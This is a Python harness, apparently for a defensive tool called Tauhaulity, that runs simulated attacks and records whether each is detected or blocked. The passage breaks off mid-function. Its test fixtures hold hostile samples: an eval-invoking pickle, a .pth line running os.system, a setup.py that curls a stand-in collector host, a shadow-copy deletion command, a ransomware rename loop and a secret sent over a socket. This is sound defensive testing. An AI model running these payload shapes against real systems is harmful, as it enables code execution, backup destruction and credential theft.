"""Measure what Tauhaulity actually detects and what it actually prevents.

Claims about security are cheap. This harness runs real scenarios against the
shipped code and prints three facts per scenario: whether the attack is detected,
whether it is prevented or blocked, and the evidence line the tool produced. The
distinction matters to a user deciding whether to adopt it: a detector changes
what you know, a control changes what can happen.

Run:  python scripts/assess_security.py          table
      python scripts/assess_security.py --json   machine readable
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import tempfile
from dataclasses import asdict, dataclass
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"

DETECTED = "detected"
BLOCKED = "blocked"
NOT_DETECTED = "not detected"
NOT_PREVENTED = "not prevented"
NOT_APPLICABLE = "-"


@dataclass(frozen=True, slots=True)
class Result:
    """One measured scenario.

    Attributes:
        scenario: Short name.
        technique: Framework reference when one applies.
        detection: What the measurement showed for detection.
        prevention: What the measurement showed for prevention.
        evidence: The tool output that supports the verdict.
        tier: strongest guarantee this scenario demonstrates.
    """

    scenario: str
    technique: str
    detection: str
    prevention: str
    evidence: str
    tier: str


def _scan(root: Path):
    """Run a real scan and return the result object."""

    from tauhaulity.core.contracts import ScanOptions
    from tauhaulity.core.policy import Policy
    from tauhaulity.engine import run_scan

    return run_scan(
        root,
        policy=Policy(),
        options=ScanOptions(generate_repro=False, record_telemetry=False),
        write_reports=False,
    )


def _project(root: Path) -> Path:
    (root / "src").mkdir(parents=True, exist_ok=True)
    (root / "src" / "app.py").write_text("VALUE = 1" + chr(10), encoding="utf-8")
    return root


def scenario_credential_in_tree() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_tree_"))
    try:
        _project(root)
        (root / ".env").write_text("GITHUB_TOKEN=" + TOKEN + chr(10), encoding="utf-8")
        finding = _scan(root).ctx.findings[11]
        return Result("Credential in the working tree", "T1552.001", DETECTED, NOT_PREVENTED,
                      f"P11 {finding.status}: {finding.detail[:90]}", "1 - detection")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_credential_in_history() -> Result:
    if shutil.which("git") is None:
        return Result("Credential in git history", "T1552.001", "skipped", "skipped", "git is not installed", "-")
    root = Path(tempfile.mkdtemp(prefix="assess_hist_"))
    try:
        _project(root)
        env = dict(os.environ)
        env.update({"GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@e.test",
                    "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@e.test"})
        def git(*args: str) -> None:
            subprocess.run(["git", *args], cwd=str(root), capture_output=True, env=env, timeout=120, check=True)
        git("init", "-q")
        (root / ".env").write_text("GITHUB_TOKEN=" + TOKEN + chr(10), encoding="utf-8")
        git("add", "-A")
        git("commit", "-q", "-m", "leak")
        (root / ".env").unlink()
        git("add", "-A")
        git("commit", "-q", "-m", "remove")
        finding = _scan(root).ctx.findings[11]
        detected = DETECTED if finding.status == "LEAK_DETECTED" else NOT_DETECTED
        return Result("Credential already in git history", "T1552.001", detected, "only by rotation",
                      f"P11 {finding.status}: {finding.detail[:90]}", "0 - remediation only")
    except Exception as exc:
        return Result("Credential already in git history", "T1552.001", "error", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_malicious_pickle_on_disk() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_pickle_"))
    try:
        _project(root)
        (root / "payload.pkl").write_bytes(
            b"\x80\x04\x8c\x08builtins\x8c\x04eval\x93\x8c\x051+1+1\x85R."
        )
        finding = _scan(root).ctx.findings[6]
        detected = DETECTED if finding.status == "CRITICAL" else NOT_DETECTED
        return Result("Unsafe pickle file on disk", "T1195.002", detected, NOT_PREVENTED,
                      f"P06 {finding.status}: {finding.detail[:90]}", "1 - detection")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_pickle_loaded_at_runtime() -> Result:
    script = (
        "import pickle, sys, pathlib;"
        "sys.path.insert(0, sys.argv[1]);"
        "import tauhaulity;"
        "data = pathlib.Path(sys.argv[2]).read_bytes();"
        "pickle.loads(data)"
    )
    root = Path(tempfile.mkdtemp(prefix="assess_load_"))
    try:
        _project(root)
        blob = root / "payload.pkl"
        blob.write_bytes(b"\x80\x04\x8c\x08builtins\x8c\x04eval\x93\x8c\x051+1+1\x85R.")
        completed = subprocess.run(
            [sys.executable, "-c", script, str(ROOT), str(blob)],
            capture_output=True, text=True, timeout=120,
            env={**os.environ, "TAUHAULITY_ENFORCE": "1"},
        )
        blocked = completed.returncode != 0 and "Permission" in (completed.stderr + completed.stdout)
        return Result(
            "Application calls pickle.loads on that file",
            "T1203",
            "only if the application imports tauhaulity",
            BLOCKED if blocked else NOT_PREVENTED,
            ("guard raised" if blocked else "not frozen: arm tauhaulity shield, which gates unsafe deserialization"),
            "1 - detection (arm the shield for prevention)",
        )
    except Exception as exc:
        return Result("Application calls pickle.loads on that file", "T1203", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_pyc_tamper() -> Result:
    import py_compile

    root = Path(tempfile.mkdtemp(prefix="assess_pyc_"))
    try:
        _project(root)
        source = root / "src" / "mod.py"
        source.write_text("VALUE = 1" + chr(10), encoding="utf-8")
        py_compile.compile(str(source), doraise=True)
        source.write_text("VALUE = 2" + chr(10) + "# edited after the cache was written" + chr(10), encoding="utf-8")
        finding = _scan(root).ctx.findings[6]
        detected = DETECTED if finding.status == "CRITICAL" else NOT_DETECTED
        return Result("Bytecode cache disagrees with its source", "T1027", detected, NOT_PREVENTED,
                      f"P06 {finding.status}: {finding.detail[:90]}", "1 - detection")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_venv_pth_injection() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_pth_"))
    try:
        _project(root)
        site = root / ".venv" / "Lib" / "site-packages"
        site.mkdir(parents=True, exist_ok=True)
        (root / ".venv" / "pyvenv.cfg").write_text("home = " + sys.base_prefix + chr(10), encoding="utf-8")
        (site / "inject.pth").write_text("import os; os.system('calc')" + chr(10), encoding="utf-8")
        finding = _scan(root).ctx.findings[10]
        detected = DETECTED if finding.status == "MALICIOUS_PTH" else NOT_DETECTED
        return Result("Code execution inside a .pth file", "T1546", detected, NOT_PREVENTED,
                      f"P10 {finding.status}: {finding.detail[:90]}", "1 - detection")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_record_mismatch() -> Result:
    import base64
    import hashlib

    root = Path(tempfile.mkdtemp(prefix="assess_record_"))
    try:
        _project(root)
        site = root / ".venv" / "Lib" / "site-packages"
        dist_info = site / "demo-1.0.0.dist-info"
        dist_info.mkdir(parents=True, exist_ok=True)
        payload = b"VALUE = 1" + chr(10).encode()
        (site / "demo.py").write_bytes(payload)
        digest = base64.urlsafe_b64encode(hashlib.sha256(payload).digest()).decode("ascii").rstrip("=")
        (dist_info / "RECORD").write_text(f"demo.py,sha256={digest},{len(payload)}" + chr(10), encoding="utf-8")
        (site / "demo.py").write_bytes(payload + b"# tampered after install" + chr(10).encode())
        finding = _scan(root).ctx.findings[10]
        detected = DETECTED if finding.status == "TAMPERED" else NOT_DETECTED
        return Result("Installed package file changed after install", "T1554", detected, NOT_PREVENTED,
                      f"P10 {finding.status}: {finding.detail[:90]}", "1 - detection")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_git_gate() -> Result:
    if shutil.which("git") is None:
        return Result("Commit of a credential is attempted", "T1552.001", "skipped", "skipped", "git is not installed", "-")
    root = Path(tempfile.mkdtemp(prefix="assess_gate_"))
    try:
        _project(root)
        env = dict(os.environ)
        env.update({"GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@e.test",
                    "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@e.test", "PYTHONPATH": str(ROOT)})
        def git(*args: str, check: bool = True):
            return subprocess.run(["git", *args], cwd=str(root), capture_output=True, text=True, env=env, timeout=180)
        git("init", "-q")
        from tauhaulity.tools.hook_installer import install_hook

        install_hook(root, block=True)
        (root / ".env").write_text("GITHUB_TOKEN=" + TOKEN + chr(10), encoding="utf-8")
        git("add", "-A")
        commit = git("commit", "-m", "leak")
        blocked = commit.returncode != 0
        leaked = TOKEN in (commit.stdout + commit.stderr)
        note = "gate blocked the commit" if blocked else "commit succeeded"
        if leaked:
            note += " but the raw token was printed"
        return Result("Commit of a credential is attempted", "T1552.001", DETECTED, BLOCKED if blocked else NOT_PREVENTED,
                      note, "2 - prevention")
    except Exception as exc:
        return Result("Commit of a credential is attempted", "T1552.001", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_honeytoken_read() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_honey_"))
    try:
        from tauhaulity.tools.honeytoken import deploy, token_paths

        project = _project(root)
        deploy(project)
        decoy = token_paths(project)[0]
        script = (
            "import sys, pathlib;"
            "sys.path.insert(0, sys.argv[1]);"
            "from tauhaulity.runtime import audit_hook;"
            "from tauhaulity.tools.honeytoken import token_paths;"
            "audit_hook.set_honeypot_paths([str(p) for p in token_paths(pathlib.Path(sys.argv[2]))]);"
            "audit_hook.guard.install(enforce=True);"
            "open(sys.argv[3], 'rb').read();"
            "print('read escaped')"
        )
        completed = subprocess.run(
            [sys.executable, "-c", script, str(ROOT), str(project), str(decoy)],
            capture_output=True, text=True, timeout=180,
            env={**os.environ, "TAUHAULITY_HONEYPOT_ENFORCE": "1"},
        )
        blocked = "read escaped" not in completed.stdout
        return Result(
            "A credential stealer reads a decoy credential",
            "T1555",
            DETECTED,
            BLOCKED if blocked else "recorded only",
            "guard refused the read" if blocked else "guard recorded the read (watch mode)",
            "2 - prevention (opt in)",
        )
    except Exception as exc:
        return Result("A credential stealer reads a decoy credential", "T1555", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_canary_tamper() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_canary_"))
    try:
        import time

        from tauhaulity.daemon.watch import watch_loop

        import threading

        project = _project(root)
        canary = project / "canary.txt"
        canary.write_text("decoy" + chr(10), encoding="utf-8")
        events: list[object] = []

        def stop_after(_event: object) -> None:
            events.append(_event)

        def tamper() -> None:
            time.sleep(0.25)
            canary.write_text("tampered by a fake ransomware burst" + chr(10), encoding="utf-8")

        writer = threading.Thread(target=tamper, daemon=True)
        writer.start()
        watch_loop(project, interval_s=0.05, duration_s=1.0, backend="polling", on_event=stop_after)
        writer.join(timeout=5)
        return Result(
            "A destructive writer rewrites a decoy file",
            "T1486",
            DETECTED if events else NOT_DETECTED,
            "opt in (freeze on POSIX)",
            f"{len(events)} event(s) observed" if events else "no event observed",
            "1 - detection",
        )
    except Exception as exc:
        return Result("A destructive writer rewrites a decoy file", "T1486", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_ransomware_burst() -> Result:
    """A rename wave is measured with the guard enforcing the burst flag.

    The subprocess performs a calm rename phase first, waits out the tracker
    warm-up, then renames forty files to a suffix it has never used. The detector
    must report one verdict and, because the flag is on, refuse the operation that
    crosses the threshold.
    """

    root = Path(tempfile.mkdtemp(prefix="assess_burst_"))
    try:
        script = (
            "import json, os, sys, time" + chr(10)
            + "from pathlib import Path" + chr(10)
            + "from tauhaulity.runtime import audit_hook" + chr(10)
            + "from tauhaulity.runtime.audit_hook import GuardPolicy, arm_shield" + chr(10)
            + "project = Path(sys.argv[1])" + chr(10)
            + "project.mkdir(parents=True, exist_ok=True)" + chr(10)
            + "arm_shield(GuardPolicy(enforce=True, burst_window_s=0.2, burst_threshold=12, deny_ransom_burst=True))" + chr(10)
            + "for index in range(5):" + chr(10)
            + "    (project / ('warm_%d.py' % index)).write_text('x', encoding='utf-8')" + chr(10)
            + "for index in range(5):" + chr(10)
            + "    os.rename(project / ('warm_%d.py' % index), project / ('warm_%d_b.py' % index))" + chr(10)
            + "time.sleep(0.35)" + chr(10)
            + "blocked = False" + chr(10)
            + "message = ''" + chr(10)
            + "for index in range(40):" + chr(10)
            + "    source = project / ('doc_%d.txt' % index)" + chr(10)
            + "    source.write_text('payload', encoding='utf-8')" + chr(10)
            + "    try:" + chr(10)
            + "        os.rename(source, project / ('doc_%d.txt.locked' % index))" + chr(10)
            + "    except PermissionError as exc:" + chr(10)
            + "        blocked = True" + chr(10)
            + "        message = str(exc)" + chr(10)
            + "        break" + chr(10)
            + "print(json.dumps({'blocked': blocked, 'message': message, 'summary': audit_hook.burst_summary()}))" + chr(10)
        )
        completed = subprocess.run(
            [sys.executable, "-c", script, str(root)],
            capture_output=True,
            text=True,
            timeout=180,
            env={**os.environ, "TAUHAULITY_NO_AUTO": "1", "PYTHONPATH": str(ROOT)},
        )
        assert completed.returncode == 0, completed.stderr
        lines = [line for line in completed.stdout.strip().splitlines() if line.strip()]
        assert lines, completed.stderr
        payload = json.loads(lines[-1])
        verdicts = int(payload["summary"].get("verdicts", 0) or 0)
        blocked = bool(payload["blocked"])
        return Result(
            "A ransomware rename wave rewrites the tree",
            "T1486",
            DETECTED if verdicts >= 1 else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            str(verdicts)
            + " verdict(s); "
            + (str(payload["message"])[:90] if blocked else "the crossing rename was not refused"),
            "2 - prevention (opt in)",
        )
    except Exception as exc:
        return Result(
            "A ransomware rename wave rewrites the tree",
            "T1486",
            "-",
            "-",
            f"{type(exc).__name__}: {exc}",
            "-",
        )
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_backup_tampering() -> Result:
    """The backup-destruction classifier is run against the real command shape."""

    try:
        from tauhaulity.tools.backup_guard import inspect_command

        signal = inspect_command(["vssadmin", "delete", "shadows", "/all", "/quiet"])
        detected = signal is not None and signal.severity == "high"
        evidence = (
            signal.kind + " at severity " + signal.severity + ": " + signal.command
            if signal is not None
            else "no signal produced"
        )
        return Result(
            "Shadow copies are deleted before encryption",
            "T1490",
            DETECTED if detected else NOT_DETECTED,
            NOT_PREVENTED,
            evidence,
            "1 - detection",
        )
    except Exception as exc:
        return Result(
            "Shadow copies are deleted before encryption",
            "T1490",
            "-",
            "-",
            f"{type(exc).__name__}: {exc}",
            "-",
        )


def scenario_undo_recovery() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_undo_"))
    try:
        from tauhaulity.daemon.undo_store import UndoStore

        project = _project(root)
        tree = project / "work" / "nested"
        tree.mkdir(parents=True)
        (tree / "important.txt").write_text("data" + chr(10) * 10, encoding="utf-8")
        store = UndoStore(project, ring_mb=64)
        entries = store.capture([project / "work"])
        shutil.rmtree(project / "work")
        restored = store.restore(entries[0].entry_id)
        ok = (tree / "important.txt").is_file()
        return Result("Accidental deletion of a directory tree", "T1485",
                      DETECTED, BLOCKED if ok else NOT_PREVENTED,
                      f"restored {restored.restored} item(s); file present: {ok}", "3 - recovery")
    except Exception as exc:
        return Result("Accidental deletion of a directory tree", "T1485", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_memory_tamper() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_mem_"))
    try:
        from tauhaulity.pillars.p01_memory import compare_baseline, make_record, ModuleBaseline

        marker = "a" * 64
        before = make_record(Path("/p"), [ModuleBaseline("alpha", "/p/a.so", 1, marker, (marker,), "2026-01-01T00:00:00Z")])
        after = make_record(Path("/p"), [ModuleBaseline("alpha", "/p/a.so", 1, "b" * 64, ("b" * 64,), "2026-01-01T00:00:00Z")])
        deltas = compare_baseline(after, before)
        return Result("A loaded module image is patched in memory", "T1055",
                      DETECTED if deltas else NOT_DETECTED, NOT_PREVENTED,
                      f"{len(deltas)} delta(s): {deltas[0].kind} {deltas[0].module}" if deltas else "no delta",
                      "1 - detection (with a baseline)")
    except Exception as exc:
        return Result("A loaded module image is patched in memory", "T1055", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_exposed_listener() -> Result:
    import socket

    from tauhaulity.pillars.p09_ports import EXPOSURE_PORTS

    root = Path(tempfile.mkdtemp(prefix="assess_port_"))
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        _project(root)
        bound_port = 0
        for candidate in EXPOSURE_PORTS:
            probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                probe.bind(("0.0.0.0", candidate))
                probe.listen(1)
            except OSError:
                probe.close()
                continue
            server.close()
            server = probe
            bound_port = candidate
            break
        if not bound_port:
            return Result("Development service listening on every interface", "T1046", "skipped", "-",
                          "every development port is already in use on this host", "-")
        finding = _scan(root).ctx.findings[9]
        detail = finding.detail
        detected = DETECTED if finding.status == "WARNING" and "reachable" in detail else NOT_DETECTED
        return Result("Development service listening on every interface", "T1046", detected, "advisory only",
                      f"P09 {finding.status} on port {bound_port}: {detail[-90:]}", "1 - detection (advisory)")
    finally:
        server.close()
        shutil.rmtree(root, ignore_errors=True)


def _fake_package(root: Path, body: str) -> tuple[Path, str]:
    """Create a package that looks like a third-party dependency.

    The fake site-packages layout is what the guard's provenance classifier keys
    on, so the scenario exercises the real decision path rather than a mock.
    """

    site = root / "site-packages"
    package = site / "evilpkg"
    package.mkdir(parents=True, exist_ok=True)
    (package / "__init__.py").write_text(body, encoding="utf-8")
    return site, "evilpkg"


def _run_guarded(site: Path, code: str, *, enforce: bool = True, timeout: float = 120.0):
    """Run code in a subprocess with the guard armed and the fake package importable."""

    script = (
        "import sys;" + chr(10)
        + "sys.path.insert(0, sys.argv[1]);" + chr(10)
        + "sys.path.insert(0, sys.argv[2]);" + chr(10)
        + "from tauhaulity.runtime import audit_hook;" + chr(10)
        + "audit_hook.arm_shield(audit_hook.GuardPolicy(enforce=True, allowlist=('tauhaulity',)));" + chr(10)
        + code
    )
    env = {**os.environ, "TAUHAULITY_ENFORCE": "1" if enforce else "0", "PYTHONPATH": str(ROOT)}
    return subprocess.run(
        [sys.executable, "-c", script, str(ROOT), str(site)],
        capture_output=True, text=True, timeout=timeout, env=env,
    )


def scenario_guarded_socket(root_holder: list | None = None) -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_guard_net_"))
    server = None
    try:
        import socket as _socket

        server = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        port = server.getsockname()[1]
        site, _name = _fake_package(
            root,
            "import socket" + chr(10)
            + "def call():" + chr(10)
            + f"    s = socket.socket()" + chr(10)
            + f"    s.connect(('127.0.0.1', {port}))" + chr(10)
            + "    return 'connected'" + chr(10),
        )
        completed = _run_guarded(site, "import evilpkg; print(evilpkg.call())")
        blocked = completed.returncode != 0 and "deny_third_party_connect" in (completed.stderr + completed.stdout)
        return Result(
            "Third-party package opens a network socket",
            "T1041",
            DETECTED if blocked else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            "guard denied socket.connect" if blocked else "the call was not blocked",
            "2 - prevention (enforced)",
        )
    except Exception as exc:
        return Result("Third-party package opens a network socket", "T1041", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        if server is not None:
            server.close()
        shutil.rmtree(root, ignore_errors=True)


def scenario_guarded_subprocess() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_guard_spawn_"))
    try:
        site, _name = _fake_package(
            root,
            "import subprocess" + chr(10)
            + "def call():" + chr(10)
            + "    subprocess.Popen(['cmd', '/c', 'echo hi'] if __import__('os').name == 'nt' else ['/bin/echo', 'hi'])" + chr(10)
            + "    return 'spawned'" + chr(10),
        )
        completed = _run_guarded(site, "import evilpkg; print(evilpkg.call())")
        blocked = completed.returncode != 0 and "deny_third_party_subprocess" in (completed.stderr + completed.stdout)
        return Result(
            "Third-party package spawns a process",
            "T1059",
            DETECTED if blocked else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            "guard denied subprocess.Popen" if blocked else "the spawn was not blocked",
            "2 - prevention (enforced)",
        )
    except Exception as exc:
        return Result("Third-party package spawns a process", "T1059", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_guarded_secret_read() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_guard_read_"))
    try:
        project = _project(root)
        (project / ".env").write_text("TOKEN=hidden" + chr(10), encoding="utf-8")
        site, _name = _fake_package(
            root,
            "from pathlib import Path" + chr(10)
            + "def call(target):" + chr(10)
            + "    return Path(target).read_text(encoding='utf-8')" + chr(10),
        )
        completed = _run_guarded(
            site,
            f"import evilpkg; print(evilpkg.call(r'{project / '.env'}'))",
        )
        blocked = completed.returncode != 0 and "deny_sensitive_reads" in (completed.stderr + completed.stdout)
        return Result(
            "Third-party package reads the project .env",
            "T1552.001",
            DETECTED if blocked else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            "guard denied the read" if blocked else "the read was not blocked",
            "2 - prevention (enforced)",
        )
    except Exception as exc:
        return Result("Third-party package reads the project .env", "T1552.001", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_typosquat_dependency() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_deps_"))
    try:
        from tauhaulity.tools.dep_audit import audit_dependencies

        _project(root)
        (root / "requirements.txt").write_text(
            "reqeusts==2.31.0" + chr(10) + "0requests==0.0.1" + chr(10) + "flask" + chr(10), encoding="utf-8"
        )
        report = audit_dependencies(root)
        kinds = {finding.kind for finding in report.findings}
        detected = DETECTED if {"typosquat", "suspicious_name"} & kinds else NOT_DETECTED
        return Result(
            "A typosquatted dependency is declared",
            "T1195.002",
            detected,
            "refused before install",
            report.detail[:140],
            "2 - prevention (pre-install)",
        )
    except Exception as exc:
        return Result("A typosquatted dependency is declared", "T1195.002", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_install_time_execution() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_setup_"))
    try:
        _project(root)
        (root / "setup.py").write_text(
            "import subprocess" + chr(10)
            + "from setuptools import setup" + chr(10)
            + "subprocess.run(['curl', 'http://collector.example.test/x'])" + chr(10)
            + "setup(name='demo', version='1.0')" + chr(10),
            encoding="utf-8",
        )
        finding = _scan(root).ctx.findings[6]
        detected = DETECTED if finding.status != "SAFE" else NOT_DETECTED
        return Result(
            "A package runs code at install time",
            "T1195.002",
            detected,
            NOT_PREVENTED,
            f"P06 {finding.status}: {finding.detail[:120]}",
            "1 - detection",
        )
    except Exception as exc:
        return Result("A package runs code at install time", "T1195.002", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_quarantine_neutralises() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_quarantine_"))
    try:
        from tauhaulity.tools.quarantine import QuarantineStore, suggest_quarantine

        project = _project(root)
        payload = project / "payload.pkl"
        payload.write_bytes(b"\x80\x04\x8c\x08builtins\x8c\x04eval\x93\x8c\x051+1+1\x85R.")
        candidates = suggest_quarantine(project)
        store = QuarantineStore(project)
        report = store.quarantine(candidates, reason="assessment: untrusted download")
        gone = not payload.exists()
        restored = store.restore(report.items[0].item_id) if report.items else False
        return Result(
            "Unsafe artefact is neutralised on disk",
            "T1195.002",
            DETECTED if report.items else NOT_DETECTED,
            BLOCKED if gone and restored else NOT_PREVENTED,
            f"quarantined {len(report.items)} file(s); original removed: {gone}; restorable: {restored}",
            "2 - prevention (reversible)",
        )
    except Exception as exc:
        return Result("Unsafe artefact is neutralised on disk", "T1195.002", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_deserialization_blocked() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_deser_"))
    try:
        stream = root / "payload.pkl"
        stream.write_bytes(b"\x80\x04\x8c\x08builtins\x8c\x04eval\x93\x8c\x051+1+1\x85R.")
        # The gate wraps the loaders that are already imported when it arms, which
        # is how a real application behaves: pickle is imported at startup, then
        # the shield arms before untrusted data is read.
        script = (
            "import sys, pathlib, pickle;" + chr(10)
            + "sys.path.insert(0, sys.argv[1]);" + chr(10)
            + "from tauhaulity.runtime import audit_hook;" + chr(10)
            + "audit_hook.arm_shield(audit_hook.GuardPolicy(enforce=True, allowlist=('tauhaulity',)));" + chr(10)
            + "pickle.loads(pathlib.Path(sys.argv[2]).read_bytes())" + chr(10)
            + "print('loaded without a block')"
        )
        completed = subprocess.run(
            [sys.executable, "-c", script, str(ROOT), str(stream)],
            capture_output=True, text=True, timeout=180,
            env={**os.environ, "TAUHAULITY_ENFORCE": "1", "PYTHONPATH": str(ROOT)},
        )
        blocked = completed.returncode != 0 and "deny_unsafe_deserialization" in (completed.stderr + completed.stdout)
        return Result(
            "Application loads a malicious pickle at runtime",
            "T1203",
            DETECTED if blocked else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            "guard refused the stream by opcode" if blocked else "the load was not blocked",
            "2 - prevention (enforced)",
        )
    except Exception as exc:
        return Result("Application loads a malicious pickle at runtime", "T1203", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_secret_blocked_on_the_wire() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_egress_"))
    receiver = None
    try:
        import socket as _socket

        secret = "sk-live-9f2b7c4d1e6a8b3c5d7e9f01"
        env_file = root / ".env"
        env_file.write_text("PROD_TOKEN=" + secret + chr(10), encoding="utf-8")
        receiver = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        receiver.bind(("127.0.0.1", 0))
        receiver.listen(1)
        port = receiver.getsockname()[1]
        script = (
            "import sys, socket;" + chr(10)
            + "sys.path.insert(0, sys.argv[1]);" + chr(10)
            + "from tauhaulity.runtime import audit_hook;" + chr(10)
            + "audit_hook.arm_shield(audit_hook.GuardPolicy(enforce=True, allowlist=('tauhaulity',)), secret_files=(sys.argv[2],));" + chr(10)
            + "s = socket.create_connection(('127.0.0.1', int(sys.argv[3])));" + chr(10)
            + "s.sendall(b'POST /collect HTTP/1.1\\r\\nX-Token: ' + sys.argv[4].encode());" + chr(10)
            + "print('sent')"
        )
        completed = subprocess.run(
            [sys.executable, "-c", script, str(ROOT), str(env_file), str(port), secret],
            capture_output=True, text=True, timeout=180,
            env={**os.environ, "TAUHAULITY_ENFORCE": "1", "PYTHONPATH": str(ROOT)},
        )
        combined = completed.stdout + completed.stderr
        blocked = completed.returncode != 0 and "deny_egress_with_secrets" in combined
        leaked = secret in combined
        if blocked:
            evidence = "guard refused the send by label and offset"
        else:
            evidence = "no refusal: " + combined.strip().splitlines()[-1][:120] if combined.strip() else "no output"
        if leaked:
            evidence += " (the value appeared in the error text)"
        return Result(
            "A dependency exfiltrates a secret over a socket",
            "T1041",
            DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            evidence,
            "2 - prevention (enforced)",
        )
    except Exception as exc:
        return Result("A dependency exfiltrates a secret over a socket", "T1041", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        if receiver is not None:
            receiver.close()
        shutil.rmtree(root, ignore_errors=True)


def scenario_stale_feed_is_reported() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_feed_"))
    try:
        from tauhaulity.tools.threat_feed import status

        _project(root)
        fresh = status(root=root)
        # No cache under a fresh directory, so the tool must say so rather than
        # reporting that the rules are current.
        reported = "missing" in fresh.detail or fresh.stale
        return Result(
            "Local threat data has gone stale",
            "-",
            DETECTED if reported else NOT_DETECTED,
            "warned, never auto-refreshed",
            fresh.detail[:130],
            "1 - detection (honesty control)",
        )
    except Exception as exc:
        return Result("Local threat data has gone stale", "-", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_child_process_contained() -> Result:
    """A dependency spawns a Python worker that tries to read the project .env."""

    root = Path(tempfile.mkdtemp(prefix="assess_child_"))
    try:
        project = _project(root)
        (project / ".env").write_text("TOKEN=assessment" + chr(10), encoding="utf-8")
        site, package = _fake_package(
            project,
            "from pathlib import Path" + chr(10)
            + "def read_env():" + chr(10)
            + "    return Path('.env').read_text(encoding='utf-8')" + chr(10),
        )
        # The child must do the work from a site-packages frame, otherwise the guard
        # is right to allow it: reading a project file from project code is normal.
        child_code = (
            "import sys;" + chr(10)
            + "sys.path.insert(0, r'" + str(site) + "');" + chr(10)
            + "import " + package + ";" + chr(10)
            + "print(" + package + ".read_env())"
        )
        child_literal = repr(child_code)
        script = (
            "import os, subprocess, sys;" + chr(10)
            + "sys.path.insert(0, r'" + str(ROOT) + "');" + chr(10)
            + "done = subprocess.run([sys.executable, '-c', " + child_literal + "], capture_output=True, text=True, env=dict(os.environ));" + chr(10)
            + "print('CHILD-RC', done.returncode, (done.stdout + done.stderr).strip()[-200:])"
        )
        env = {**os.environ, "TAUHAULITY_ENFORCE": "1", "PYTHONPATH": str(ROOT)}
        plain = subprocess.run([sys.executable, "-c", script], cwd=str(project), capture_output=True, text=True, timeout=180, env=env)
        # Now the same shape, but the parent propagates the guard into the child.
        propagated_script = (
            "import os, sys, subprocess;" + chr(10)
            + "sys.path.insert(0, r'" + str(ROOT) + "');" + chr(10)
            + "from tauhaulity.runtime import audit_hook;" + chr(10)
            + "env = dict(os.environ); env['TAUHAULITY_ENFORCE'] = '1';" + chr(10)
            + "child_env = audit_hook.guard_propagation(env);" + chr(10)
